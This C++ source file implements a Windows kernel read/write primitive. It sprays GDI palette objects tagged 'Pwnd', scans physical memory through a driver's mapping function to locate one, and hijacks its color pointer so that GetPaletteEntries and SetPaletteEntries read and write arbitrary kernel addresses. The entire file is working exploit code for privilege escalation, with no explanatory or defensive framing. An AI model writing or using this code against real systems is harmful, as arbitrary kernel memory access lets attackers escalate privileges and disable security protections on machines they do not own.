#include "KernelPrimitives.h"

#include <iostream>
#include <sstream>
#include <exception>

constexpr size_t NUMBER_OF_PALETTES = 0x3000;
constexpr size_t BUFFER_SIZE = 0x10000;
constexpr size_t ALLOCATION_SIZE = BUFFER_SIZE + FIELD_OFFSET(PALETTE64, apalColors);
constexpr PALETTEENTRY PALETTE_IDENTIFIER = { 'P', 'w', 'n', 'd' };

bool operator==(const PALETTEENTRY& First, const PALETTEENTRY& Second) {
	return *reinterpret_cast<const UINT32*>(&First) == *reinterpret_cast<const UINT32*>(&Second);
}

bool operator!=(const PALETTEENTRY& First, const PALETTEENTRY& Second) {
	return !(First == Second);
}

constexpr ULONG NUMBER_OF_ID_ENTRIES = 0x10;

template <ULONG N>
struct LOGPALETTEN : LOGPALETTE {
	PALETTEENTRY apalColor[N - 1];
};

/*
	Checks if a pointer is pointing at a palette, return its index if it is, otherwise return -1
*/
template <ULONG N>
UINT32 GetPaletteIndexFromPointer(const PBYTE Pointer, DWORD Tid) {
	const auto* entryPointer = (UINT32*)Pointer;
	for (auto i = 0; i < N; ++i) {
		if (*entryPointer++ != *(UINT32*)&PALETTE_IDENTIFIER) return -1;
	}
	auto id = *((const UINT32*)entryPointer);
	if (id >= NUMBER_OF_PALETTES)
		return -1;

	OutputDebugStringA("Found candidate palette pointer\n");
	return id;
	// assume it's pointing at a palette, let's make some extra checks, to be certai
	//const auto* palette = reinterpret_cast<const PALETTE64*>(Pointer - FIELD_OFFSET(PALETTE64, apalColors));
	//if (palette->cEntries == 3 && palette->apalColors[1] == PALETTE_IDENTIFIER) {
	//	return *reinterpret_cast<const UINT32*>(&palette->apalColors[2]);
	//} 	
}

VOID KernelReadWrite::SprayPalettes(std::vector<HPALETTE>& Palettes) {
	LOGPALETTEN<NUMBER_OF_ID_ENTRIES + 2> palette{};
	palette.palVersion = 0x300;
	palette.palNumEntries = NUMBER_OF_ID_ENTRIES + 1;
	for (auto i = 0; i < NUMBER_OF_ID_ENTRIES; ++i) {
		palette.apalColor[i] = PALETTE_IDENTIFIER;
	}

	LOGGER.info("Starting to spray palettes");
	for (UINT32 i = 0; i < NUMBER_OF_PALETTES; ++i) {
		palette.apalColor[NUMBER_OF_ID_ENTRIES] = *reinterpret_cast<PALETTEENTRY*>(&i);
		Palettes.push_back(CreatePalette(&palette));
		if (i % 0x100 == 0) {
			LOGGER.debug("SprayPalettes: [", i / 0x100, ":", NUMBER_OF_PALETTES / 0x100, "]");
		}
	}
	LOGGER.info("Finished spraying palettes");
}

constexpr ULONG ACCESS_INTERVAL = 100;

/*
	Finds a palette in-memory and saves a virtual-memory mapping to it, and its handle.
*/
VOID KernelReadWrite::FindMappedPalette(const std::vector<HPALETTE>& Palettes) {
	ULONG_PTR currentPhysicalAddress = 0;
	PBYTE mappedPage = nullptr;
	auto tid = GetCurrentThreadId();
	auto numberOfPages = 0;
	while ((mappedPage =
		reinterpret_cast<PBYTE>(this->driver.MapPhysicalMemory(ALLOCATION_SIZE, currentPhysicalAddress))) != nullptr) {
		auto paletteIndex = 0;

		for (auto i = FIELD_OFFSET(PALETTE64, apalColors); i < ALLOCATION_SIZE - sizeof(PALETTEENTRY); ++i) {
			paletteIndex = GetPaletteIndexFromPointer<NUMBER_OF_ID_ENTRIES>(mappedPage + i, tid);
			if (paletteIndex != -1) {
				// found a palette
				this->foundPaletteAddress = reinterpret_cast<PALETTE64*>(mappedPage + i - FIELD_OFFSET(PALETTE64, apalColors) - sizeof(PALETTEENTRY));
				this->foundPaletteHandle = Palettes[paletteIndex];
				
				LOGGER.info("Found palette at index ", paletteIndex, " with address ", std::hex, this->foundPaletteAddress);
				break;
			}
		}
		if (this->foundPaletteAddress)
			break;

		if (numberOfPages % ACCESS_INTERVAL == 0) {
			LOGGER.debug("Accessing all palettes for the ", numberOfPages / ACCESS_INTERVAL, "th time");
			this->AccessAllPalettes(Palettes); // make sure it's not paged out
		}
		++numberOfPages;
		this->driver.UnmapPhysicalMemory(mappedPage);
		currentPhysicalAddress += BUFFER_SIZE;
	}
}

VOID KernelReadWrite::FreeOtherPalettes(const std::vector<HPALETTE>&& Palettes) {
	for (auto i = 0; i < Palettes.size(); ++i) {
		if (Palettes[i] != this->foundPaletteHandle) {
			DeleteObject(Palettes[i]);
		}
	}
}

KernelReadWrite::KernelReadWrite(const std::string& DriverPath) : driver(DriverPath) {
	std::vector<HPALETTE> palettes;
	// step 1: spray palettes
	this->SprayPalettes(palettes);
	std::cout << "Sprayed palettes\n";
	// step 2: find palette in physical memory and save mapped page
	this->FindMappedPalette(palettes);
	std::cout << "Found mapped palette, handle " << std::hex << \
		this->foundPaletteHandle << " Mapped address " << this->foundPaletteAddress << std::endl;
	if (this->foundPaletteAddress == nullptr) {
		throw std::runtime_error("Failed to find palette");
	}
	// step 3: cleanup the rest
	this->FreeOtherPalettes(std::move(palettes));
	std::cout << "Freed other palettes\n";
}

ULONG64 KernelReadWrite::ReadQword(PVOID Address) {
	this->foundPaletteAddress->pFirstColor = reinterpret_cast<PALETTEENTRY*>(Address);
	UINT32 result[2];
	if (GetPaletteEntries(this->foundPaletteHandle, 0, 2, reinterpret_cast<PALETTEENTRY*>(&result)) != 2) {
		throw std::exception("Failed to read from address");
	}
	std::cout << "Read from address " << std::hex << Address << " got " << result[1] << result[0] << "\n";
	return *reinterpret_cast<ULONG64*>(&result);
}

VOID KernelReadWrite::WriteQword(ULONG64 Value, PVOID Address) {
	this->foundPaletteAddress->pFirstColor = reinterpret_cast<PALETTEENTRY*>(Address);
	ULONG64 localVal = Value;
	if (SetPaletteEntries(this->foundPaletteHandle, 0, 2, reinterpret_cast<const PALETTEENTRY*>(&localVal)) != 2) {
		throw std::exception("Failed to write to address");
	}
	std::cout << "Written to " << std::hex << Address << "value " << Value << std::endl;
}

VOID KernelReadWrite::AccessAllPalettes(const std::vector<HPALETTE>& Palettes) const {
	PALETTEENTRY temp = { 0 };
	for (auto palette : Palettes) {
		GetPaletteEntries(palette, 0, 1, &temp);
	}
}